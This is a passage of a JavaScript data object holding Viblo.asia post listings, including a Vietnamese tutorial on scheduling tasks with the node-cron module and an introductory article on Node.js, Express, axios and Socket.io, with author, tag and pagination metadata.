n\u1ebfu c\u00f3 g\u00ec ch\u01b0a t\u1ed1t mong nh\u1eadn \u0111\u01b0\u1ee3c s\u1ef1 \u0111\u00f3ng g\u00f3p c\u1ee7a m\u1ecdi ng\u01b0\u1eddi :handshake::handshake::handshake:',
      published_at: "2020-11-13 15:06:08",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 10:00:25",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 7,
      points: 5,
      views_count: 78,
      clips_count: 0,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/05eb5512-98fc-4b88-bc36-34421282f99a.png",
      user: {
        data: {
          id: 27788,
          url: "https://viblo.asia/u/ngovannghia",
          avatar: "b6674e3a-6311-4de3-bc7b-caf308af9848.png",
          name: "Ng\u00f4 V\u0103n Ngh\u0129a",
          username: "ngovannghia",
          followers_count: 72,
          reputation: 2108,
          posts_count: 40,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "blockchain",
            name: "Blockchain",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=Blockchain&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "ethereum",
            name: "Ethereum",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=Ethereum&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
      organization: {
        data: {
          id: 82,
          name: "Sun* Blockchain Team",
          user_id: 11,
          avatar: "bfed898e-7be3-41c3-bd23-7fc8c7743fc2.png",
          slug: "sun-blockchain-team",
          following: false,
          followers_count: 174,
          location: "Sun*",
          posts_count: 154,
          website: null,
          website_verified: false,
          members_count: 9,
          google_analytics_id: null,
          short_description:
            "We're Blockchain Research Team of R&D Lab @Sun Asterisk .Inc",
          full_description:
            "Who we are ? \n\n> We are Sun* Blockchain team \ud83d\ude0e\n\nWhat technologies we interested in ?\n\n> We are interested in Bitcoin, Eth, Hyperledger, EOS, TRON, IOTA, Tomochain, Loom Plasma, Arch, Torus, NEO... and more. \ud83d\ude0e\n\nWhat we do ?\n\n> We are developing web, apps, games. \ud83d\ude0e\n",
          approved: true,
        },
      },
    },
    {
      id: 48193,
      title: "Cron jon NodeJS v\u1edbi node-cron",
      slug: "924lJ4kbKPM",
      url: "https://viblo.asia/p/cron-jon-nodejs-voi-node-cron-924lJ4kbKPM",
      user_id: 50683,
      moderation: null,
      transliterated: "cron-jon-nodejs-voi-node-cron",
      contents_short:
        "Khi ph\u00e1t tri\u1ec3n m\u1ed9t \u1ee9ng d\u1ee5ng c\u00f3 nh\u1eefng vi\u1ec7c c\u1ea7n th\u01b0\u1ee3c hi\u1ec7n \u0111\u1ecbnh k\u00ec theo th\u1eddi gian nh\u01b0 vi\u1ec7c th\u1ed1ng k\u00ea, t\u1ed5ng h\u1ee3p, \u0111\u1ed3ng b\u1ed9 d\u1eef li\u1ec7u hay c\u00e1c c\u00f4ng vi\u1ec7c \u0111\u1ecbnh k\u1ef3 nh\u01b0 g\u1eedi email nh\u1eafc nh\u1edf h\u00e0ng ng\u00e0y. Ch\u00fang ta c\u1ea7n...",
      contents:
        "Khi ph\u00e1t tri\u1ec3n m\u1ed9t \u1ee9ng d\u1ee5ng c\u00f3 nh\u1eefng vi\u1ec7c c\u1ea7n th\u01b0\u1ee3c hi\u1ec7n \u0111\u1ecbnh k\u00ec theo th\u1eddi gian nh\u01b0 vi\u1ec7c th\u1ed1ng k\u00ea, t\u1ed5ng h\u1ee3p, \u0111\u1ed3ng b\u1ed9 d\u1eef li\u1ec7u hay c\u00e1c c\u00f4ng vi\u1ec7c \u0111\u1ecbnh k\u1ef3 nh\u01b0 g\u1eedi email nh\u1eafc nh\u1edf h\u00e0ng ng\u00e0y. Ch\u00fang ta c\u1ea7n m\u1ed9t gi\u1ea3i ph\u00e1t hi\u1ec7u qu\u1ea3 cho vi\u1ec7c n\u00e0y! v\u00e0 h\u00f4m nay t\u1edb mu\u1ed1n gi\u1edbi thi\u1ec7u cho c\u00e1c b\u1ea1n m\u1ed9tmodule \u0111\u1ec3 t\u1ea1o ra c\u00e1c run job theo m\u1ed9t l\u1ecbch c\u00f3 s\u1eb5n m\u1ed9t c\u00e1ch \u0111\u01a1n gi\u1ea3n v\u00e0 hi\u1ec7u qu\u1ea3.\n\n[Node-cron](https://www.npmjs.com/package/node-cron) l\u00e0 m\u1ed9t module \u0111\u1ec3 t\u1ea1o c\u00e1c task con theo l\u1ecbch, s\u1eed d\u1ee5ng JavaScript nguy\u00ean b\u1ea3n base tr\u00ean [GNU crontab](https://www.gnu.org/software/mcron/manual/html_node/Crontab-file.html). Module n\u00e0y cho ph\u00e9p b\u1ea1n l\u1eadp l\u1ecbch t\u00e1c v\u1ee5 trong node.js b\u1eb1ng c\u00fa ph\u00e1p full crontab.\n\n## C\u00e0i \u0111\u1eb7t v\u00e0 s\u1eed d\u1ee5ng node-cron\n- C\u00e0i \u0111\u1eb7t node-cron qua npm\n> npm install --save node-cron\n\nNo\u00e0i ra c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 c\u00e0i node-cron th\u00f4ng qua c\u00e1c responsitory kh\u00e1ch nh\u01b0 yarn.\n- Import v\u00e0 t\u1ea1o m\u1ed9t cron job b\u1eb1ng node-cron\n```\nvar cron = require('node-cron');\n \ncron.schedule('* * * * *', () => {\n  console.log('running a task every minute');\n});\n```\n## crontab syntax\nM\u1ed7i crontab th\u01b0\u1eddng c\u00f3 c\u1ea5u tr\u00fac:\n```\n# \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Gi\u00e2y (kh\u00f4ng b\u1eaft bu\u1ed9c)\n # \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Ph\u00fat\n # \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Gi\u1edd\n # \u2502 \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Ng\u00e0y trong th\u00e1ng\n # \u2502 \u2502 \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500 Th\u00e1ng\n # \u2502 \u2502 \u2502 \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500 Ng\u00e0y trong tu\u1ea7n\n # \u2502 \u2502 \u2502 \u2502 \u2502 \u2502\n # \u2502 \u2502 \u2502 \u2502 \u2502 \u2502\n # * * * * * *\n```\n\n**Kho\u1ea3ng gi\u00e1 tr\u1ecb cho ph\u00e9p**\n| Tr\u01b0\u1eddng | Kho\u1ea3ng gi\u00e1 tr\u1ecb |\n| -------- | -------- |\n| Gi\u00e2y | 0-59 |\n| Ph\u00fat | 0-59 |\n| Gi\u1edd | 0-23 |\n| Ng\u00e0y trong th\u00e1ng | 1-31 |\n| Th\u00e1ng | 1-12 or JAN-DEC |\n| Ng\u00e0y trong tu\u1ea7n | 0-7 or SUN-SAT (0 ho\u1eb7c 7 l\u00e0 ch\u1ee7 nh\u1eadtr) |\n\n**C\u00e1c k\u00ed t\u1ef1 \u0111\u1eb7c bi\u1ec7t c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng**\n| K\u00fd t\u1ef1 | M\u00f4 t\u1ea3 |\n| -------- | -------- |\n| *  |  (all value)  s\u1eed d\u1ee5ng trong tr\u01b0\u1eddng h\u1ee3p t\u1ea5t c\u1ea3 c\u00e1c gi\u00e1 tr\u1ecb \u0111\u1ec1u \u0111\u00fang.  |\n| - | (range of values -) s\u1eed d\u1ee5ng \u0111\u1ec3 m\u00f4 t\u1ea3 kho\u1ea3ng gi\u00e1 tr\u1ecb |\n| , | (value list separator) s\u1eed d\u1ee5ng \u0111\u1ec3 li\u1ec7t k\u00ea c\u00e1c gi\u00e1 tr\u1ecb |\n| / | (step values) s\u1eed d\u1ee5ng \u0111\u1ec3 ch\u1ec9 r\u00f5 s\u1ed1 l\u1ea7n t\u0103ng |\n\n**M\u1ed9t s\u1ed1 Tips th\u00f4ng d\u1ee5ng**\n\n0 * * * * :  Ch\u1ea1y v\u00e0o l\u00fac 00 ph\u00fat c\u1ee7a m\u1ed7i gi\u1edd. \n\n1,2,4,5 * * * * : Ch\u1ea1y m\u1ed7i khi s\u1ed1 ph\u00fat b\u1eb1ng 1,2,4 ho\u1eb7c 5. \n\n## M\u1ed9t s\u1ed1 h\u00e0m \u0111\u01b0\u1ee3c cung c\u1ea5p b\u1edfi node-cron\n### Th\u00e0nh ph\u1ea7n c\u1ee7a m\u1ed9t cron\n- **expression** string: To\u00e1n t\u1eed Cron\n-  **function** Function: H\u00e0m th\u1ef1c hi\u1ec7n theo l\u1ecbch\n-  **options** Object: Optional.\n\nOptions\n    **scheduled** boolean: true n\u1ebfu t\u00e1c v\u1ee5 \u0111\u00e3 b\u1ecb thay \u0111\u1ed5i. M\u1eb7c \u0111\u1ecbnh l\u00e0 true;\n    **timezone** string: m\u00fai gi\u1edd;\n\nM\u1ed9t h\u00e0m cron \u0111\u1ea7y \u0111\u1ee7:\n```\nvar cron = require('node-cron');\n \n cron.schedule('0 1 * * *', () => {\n   console.log('Runing a job at 01:00 at America/Sao_Paulo timezone');\n }, {\n   scheduled: true,\n   timezone: \"America/Sao_Paulo\"\n });\n```\n\n### C\u00e1c h\u00e0m \u0111\u01b0\u1ee3c cung c\u1ea5p\n\n**Start**\nB\u1eaft \u0111\u1ea7u t\u1ea1o m\u1ed9t l\u1ecbch cho m\u1ed9t t\u00e1c v\u1ee5.\n\n```\nvar cron = require('node-cron');\n \nvar task = cron.schedule('* * * * *', () =>  {\n  console.log('stoped task');\n}, {\n  scheduled: false\n});\n \ntask.start();\n```\n**Stop**\nT\u1ea1o d\u1eebng th\u1ef1c thi  m\u1ed9t l\u1ecbch cho m\u1ed9t t\u00e1c v\u1ee5.\n\n```\nvar cron = require('node-cron');\n \nvar task = cron.schedule('* * * * *', () =>  {\n  console.log('will execute every minute until stopped');\n});\n \ntask.stop();\n```\n**Destroy**\nH\u1ee7y m\u1ed9t l\u1ecbch cho m\u1ed9t t\u00e1c v\u1ee5.\n\n```\nvar cron = require('node-cron');\n \nvar task = cron.schedule('* * * * *', () =>  {\n  console.log('will not execute anymore, nor be able to restart');\n});\n \ntask.destroy();\n```\n**Validate**\nValidate s\u1ef1 h\u1ee3p l\u1ec7 c\u1ee7a m\u1ed9t to\u00e1n t\u1eed cron.\n\n```\nvar cron = require('node-cron');\n \nvar valid = cron.validate('59 * * * *');\nvar invalid = cron.validate('60 * * * *');\n```\n\nNgu\u1ed3n tham kh\u1ea3o:\nhttps://www.npmjs.com/package/node-cron, \nhttps://stackjava.com/uncategorized/cron-expression-la-gi-huong-dan-cu-phap-cron-expression.html",
      published_at: "2020-11-06 14:42:18",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 02:00:12",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 2,
      points: 3,
      views_count: 364,
      clips_count: 2,
      comments_count: 2,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 50683,
          url: "https://viblo.asia/u/khanhvuquoc.1994",
          avatar: "9a5b52db-b9dd-479f-92be-f93bb90eeb7f.gif",
          name: "KhanhVQ",
          username: "khanhvuquoc.1994",
          followers_count: 4,
          reputation: 202,
          posts_count: 8,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "lich",
            name: "l\u1ecbch",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=l\u1ecbch&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "schedule",
            name: "Schedule",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Schedule&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "js",
            name: "JS",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=JS&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 50427,
            url: "https://viblo.asia/u/loizenai",
            avatar: "a5bc97e7-69cc-4ee0-9199-c0c77d33006e.jpg",
            name: "loizenai",
            username: "loizenai",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 51555,
            url: "https://viblo.asia/u/vmo11122020",
            avatar: "0cd91715-770f-473c-b35f-7a7a8d36b2dd.png",
            name: "devvmo",
            username: "vmo11122020",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 48031,
      title:
        "NodeJS l\u00e0 g\u00ec? Nh\u1eefng kh\u00e1i ni\u1ec7m c\u01a1 b\u1ea3n n\u00ean bi\u1ebft",
      slug: "6J3Zg3MWZmB",
      url:
        "https://viblo.asia/p/nodejs-la-gi-nhung-khai-niem-co-ban-nen-biet-6J3Zg3MWZmB",
      user_id: 50683,
      moderation: null,
      transliterated: "nodejs-la-gi-nhung-khai-niem-co-ban-nen-biet",
      contents_short:
        "Node JS l\u00e0 g\u00ec?\nNode.js\u00ae is a JavaScript runtime built on Chrome's V8 JavaScript engine.\n\n* NodeJS l\u00e0 m\u1ed9t n\u1ec1n t\u1ea3ng (Platform) \u0111\u01b0\u1ee3c x\u00e2y d\u1ef1ng tr\u00ean n\u1ec1n t\u1ea3ng Javascript V8 Engine. \u0110\u01b0\u1ee3c x\u00e2y d\u1ef1ng \u0111\u1ec3 ph\u00e1t ...",
      contents:
        "## Node JS l\u00e0 g\u00ec?\n> Node.js\u00ae is a JavaScript runtime built on Chrome's V8 JavaScript engine.\n\n* NodeJS l\u00e0 m\u1ed9t n\u1ec1n t\u1ea3ng (Platform) \u0111\u01b0\u1ee3c x\u00e2y d\u1ef1ng tr\u00ean n\u1ec1n t\u1ea3ng Javascript V8 Engine. \u0110\u01b0\u1ee3c x\u00e2y d\u1ef1ng \u0111\u1ec3 ph\u00e1t tri\u1ec3n nh\u1eefng \u1ee9ng d\u1ee5ng server side.\n* Ph\u1ea7n core s\u1eed d\u1ee5ng Javascript v\u00e0 C++ cho ph\u00e9p x\u1eed l\u00fd v\u1edbi hi\u1ec7u n\u0103ng cao.\n* Ph\u00f9 h\u1ee3p v\u1edbi c\u00e1c \u1ee9ng d\u1ee5ng x\u1eed l\u00fd nhanh, real time ho\u1eb7c nh\u1eefng \u1ee9ng d\u1ee5ng c\u1ea7n thay \u0111\u1ed5i c\u00f4ng ngh\u1ec7 nhanh.\n* Ch\u1ea1y sigle thread nh\u01b0ng c\u00f3 c\u01a1 ch\u1ebf non blocking gi\u00fap ch\u1ea1y b\u1ea5t \u0111\u1ed3ng b\u1ed9, t\u0103ng kh\u1ea3 n\u0103ng x\u1eed l\u00fd.\n* Th\u01b0\u1eddng ph\u00e1t tri\u1ec3n theo h\u01b0\u1edbng module h\u00f3a th\u00e0nh c\u00e1c ph\u1ea7n nh\u1ecf c\u1ee7a \u1ee9ng d\u1ee5ng v\u00e0 c\u00f3 th\u1ec3 th\u00eam module c\u00f3 s\u1eb5n b\u00ean ngo\u00e0i th\u00f4ng qua NPM, yarn....\n\n## Ki\u1ebfn tr\u00fac\n![C\u00e1c th\u00e0nh ph\u1ea7n v\u00e0 ki\u1ebfn tr\u00fac c\u1ee7a NodeJS](https://images.viblo.asia/07b0de9c-1682-4d87-a3b1-79e8d3a85760.png)\n\nC\u00e1c b\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o th\u00eam \u1edf  [\u0111\u00e2y](https://viblo.asia/p/nodejs-architecture-concept-p2-RQqKLEx6Z7z)\n\n## Non Blocking IO\nL\u00e0 ph\u01b0\u01a1ng ph\u00e1p \u0111\u1ec3 x\u1eed l\u00fd \u0111\u1ed3ng th\u1eddi nhi\u1ec1u request tr\u00ean m\u1ed9t lu\u1ed3ng \u0111\u01a1n (single thread) m\u00e0 kh\u00f4ng c\u1ea7n \u0111\u1ee3i ho\u00e0n th\u00e0nh x\u1eed l\u00fd c\u1ee7a request tr\u01b0\u1edbc r\u1ed3i m\u1edbi x\u1eed l\u00fd request sau. NodeJS s\u1eed d\u1ee5ng c\u01a1 ch\u1ebf Event loop \u0111\u1ec3 x\u1eed l\u00fd Non-blocking t\u1ea5t c\u1ea3 c\u00e1c request \u0111\u1ec3 t\u0103ng t\u1ed1c \u0111\u1ed9 x\u1eed l\u00fd nh\u01b0ng ch\u00fang ta v\u1eabn c\u00f3 th\u1ec3 x\u1eed l\u00fd \u0111\u1ed3ng b\u1ed9: s\u1eed d\u1ee5ng h\u00e0m callback, async/await, promise. \n\n## package manager\nV\u1ec1 t\u1ed5ng quan, package manager l\u00e0 m\u1ed9t kho l\u01b0u tr\u1eef nh\u1eefng \u0111\u1ec3 xu\u1ea5t b\u1ea3n(publishing ) c\u00e1c package/module \u0111\u1ec3 ng\u01b0\u1eddi kh\u00e1c c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng v\u00e0 m\u1ed9t b\u1ed9 d\u00f2ng l\u1ec7nh (command line) \u0111\u1ec3 c\u00e0i \u0111\u1eb7t, qu\u1ea3n l\u00fd version, qu\u1ea3n l\u00fd c\u00e1c g\u00f3i ph\u1ee5 thu\u1ed9c, g\u1ee1 c\u00e0i \u0111\u1eb7t c\u00e1c package/module c\u00f3 tr\u00ean kho l\u01b0u tr\u1eef.\nHi\u1ec7n t\u1ea1i c\u00f3 r\u1ea5t nhi\u1ec1u package manager \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng nh\u01b0ng th\u00f4ng d\u1ee5ng nh\u1ea5t v\u1eabn l\u00e0 npm, yarn. \nC\u00f3 th\u1ec3 t\u00ecm ki\u1ebfm v\u00e0 s\u1eed d\u1ee5ng c\u00e1c package/module \u1edf \u0111\u00e2y: [NPM](https://www.npmjs.com/), [Yarn](https://classic.yarnpkg.com/en/)\n\n## Express l\u00e0 g\u00ec?\n> Fast, unopinionated, minimalist web framework for Node.js\n\n**Web Applications**: Cung ch\u1ea5p r\u1ea5t nhi\u1ec1u t\u00ednh n\u0103ng m\u1ea1nh m\u1ebd v\u00e0 linh ho\u1ea1t tr\u00ean n\u1ec1n t\u1ea3ng web c\u0169ng nh\u01b0 nh\u1eefng \u1ee9ng d\u1ee5ng di \u0111\u1ed9ng. Express h\u1ed7 r\u1ee3 c\u00e1c ph\u01b0\u01a1ng th\u1ee9c HTTP v\u00e0 midleware t\u1ea1o ra m\u00f4t API v\u00f4 c\u00f9ng m\u1ea1nh m\u1ebd v\u00e0 d\u1ec5 s\u1eed d\u1ee5ng. C\u00f3 th\u1ec3 t\u1ed5ng h\u1ee3p m\u1ed9t s\u1ed1 ch\u1ee9c n\u0103ng ch\u00ednh c\u1ee7a express nh\u01b0 sau:\n\n**APIs**: V\u1edbi v\u1ed1 s\u1ed1 c\u00e1c ti\u1ec7n \u00edch HTPP v\u00e0 midleware t\u00f9y ch\u1ec9nh, vi\u1ec7c t\u1ea1o m\u1ed9t API v\u1edbi express tr\u1edf n\u00ean nhanh ch\u00f3ng v\u00e0 d\u1ec5 d\u00e0ng.\n\n**Performance** Express cung c\u1eadp m\u1ed9t layer(l\u1edbp) c\u00e1c t\u00ednh n\u0103ng c\u01a1 b\u1ea3n c\u1ee7a m\u1ed9t web application nh\u01b0ng kh\u00f4ng \u1ea3nh h\u01b0\u1edfng \u0111\u1ebfn c\u00e1c t\u00ednh n\u0103ng c\u00f3 s\u1eb5 c\u1ee7a NodeJS\n\n**Frameworks** L\u00e0 base(n\u1ec1n t\u1ea3ng) c\u1ee7a nhi\u1ec1u framework ph\u1ed5 bi\u1ebfn kh\u00e1c.\n\n## axios\n> Promise based HTTP client for the browser and node.js\n\nL\u00e0 m\u1ed9t th\u01b0 vi\u1ec7c r\u1ea5t th\u00f4ng d\u1ee5ng \u0111\u1ec3 t\u1ea1o m\u1ed9t promise request HTTP \u1edf c\u1ea3 client side l\u1eabn server side, \n- T\u1ea1o  [XMLHttpRequests](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) t\u1eeb browser.\n- T\u1ea1o [HTTP](https://nodejs.org/api/http.html) requests t\u1eeb NodeJS.\n- H\u1ed7 tr\u1ee3 cho [Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise) API (x\u1eed l\u00fd \u0111\u1ed3ng b\u1ed9).\n- Thay \u0111\u1ed5i d\u1eef li\u1ec7u c\u1ee7a request v\u00e0 response.\n- H\u1ee7y requests.\n- T\u1ef1 \u0111\u1ed9ng chuy\u1ec3n \u0111\u1ed5i d\u1eef li\u1ec7u th\u00e0nh d\u1eef li\u1ec7u JSON.\n- H\u1ed7 tr\u1ee3 [XSRF](https://en.wikipedia.org/wiki/Cross-site_request_forgery) cho client side.\n## Socket.io\n> FEATURING THE FASTEST AND MOST RELIABLE REAL-TIME ENGINE\n\nL\u00e0 m\u1ed9t c\u00f4ng c\u1ee5 th\u1eddi gian th\u1ef1c nhanh nh\u1ea5t v\u00e0 \u0111\u00e1ng tin c\u1eady nh\u1ea5t.\n\nSocket.io cho ph\u00e9p giao ti\u1ebfp hai chi\u1ec1u theo th\u1eddi gian th\u1ef1c th\u00f4ng qua c\u00e1c s\u1ef1 ki\u1ec7n. G\u1ed3m 2 ph\u1ea7n ch\u00ednh: M\u1ed9t m\u00e1y ch\u1ee7 Nodejs (kho l\u01b0u tr\u1eef) v\u00e0 m\u1ed9t Javascript client library (Th\u01b0 vi\u1ec7n javascript cho \u1ee9ng d\u1ee5ng kh\u00e1ch) cho client (tr\u00ecnh duy\u1ec7t, moblie, ...)\n\nNgo\u00e0i gia javascript socket.io \u0111\u01b0\u1ee3c th\u00eam v\u00e0o m\u1ed9t s\u1ed1 ng\u00f4n ng\u1eef: Java, C++, Swift, Dart.\n\n**Ngu\u1ed3n:** https://github.com/socketio/socket.io https://github.com/axios/axios https://expressjs.com/",
      published_at: "2020-10-30 14:27:13",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-19 18:00:16",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 4,
      points: 2,
      views_count: 371,
      clips_count: 0,
      comments_count: 1,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/07b0de9c-1682-4d87-a3b1-79e8d3a85760.png",
      user: {
        data: {
          id: 50683,
          url: "https://viblo.asia/u/khanhvuquoc.1994",
          avatar: "9a5b52db-b9dd-479f-92be-f93bb90eeb7f.gif",
          name: "KhanhVQ",
          username: "khanhvuquoc.1994",
          followers_count: 4,
          reputation: 202,
          posts_count: 8,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "js",
            name: "JS",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=JS&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 50427,
            url: "https://viblo.asia/u/loizenai",
            avatar: "a5bc97e7-69cc-4ee0-9199-c0c77d33006e.jpg",
            name: "loizenai",
            username: "loizenai",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
  ],
  meta: {
    pagination: {
      total: 2213,
      count: 20,
      per_page: 20,
      current_page: 1,
      total_pages: 111,
      links: {
        next: "http://viblo.asia/tags/javascript/posts?page=2",
      },
    },
  },
};
